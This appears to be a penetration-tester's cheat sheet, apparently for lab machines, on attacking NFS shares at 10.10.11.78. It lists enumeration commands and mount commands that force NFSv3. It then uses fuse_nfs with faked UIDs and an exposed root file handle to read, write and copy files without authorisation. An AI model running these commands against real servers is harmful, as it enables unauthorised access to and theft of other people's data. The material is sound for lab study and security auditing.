## Recon

Show shares that is opened to everyone

```sh
showmount -e 10.10.11.78
```

Show all mounts

```sh
showmount -a 10.10.11.78
```

Analyze the share. 

- If support `nfs3` and `sys` auth method, then we can mount and read files [#Force nfs3]({{< relref "#force-nfs3" >}})  [#Sys Auth]({{< relref "#sys-auth" >}})
- If root file handler exposed, we can read every file on the system [#Root file handler exposed]({{< relref "#root-file-handler-exposed" >}})

```sh
nfs_analyze 10.10.11.78
```

## Mount

Mount on local machine

```sh
sudo mount -t nfs 10.10.11.78:<EXPORT_PATH> ./nfs/ -o nolock
```

### Force nfs3
Force `nfs3` and mount (to fake uid to read files, require `sys` auth method)

```sh
sudo mount -t nfs -o vers=3 10.10.11.78:<EXPORT_PATH> ./nfs/ -o nolock
```

### Sys Auth

Mount with a fake uid

```sh
sudo fuse_nfs /mnt 10.10.11.78 --fake-uid --allow-write --export <EXPORT_PATH>
```

Copy all files

```sh
sudo cp -r /mnt/ ./
sudo chown -R kali:kali ./mnt
```

### Root file handler exposed

Mount with a fake uid and manual file handler

```sh
sudo fuse_nfs /mnt 10.10.11.78 --fake-uid --allow-write --manual-fs <FILE_HANDLE>
```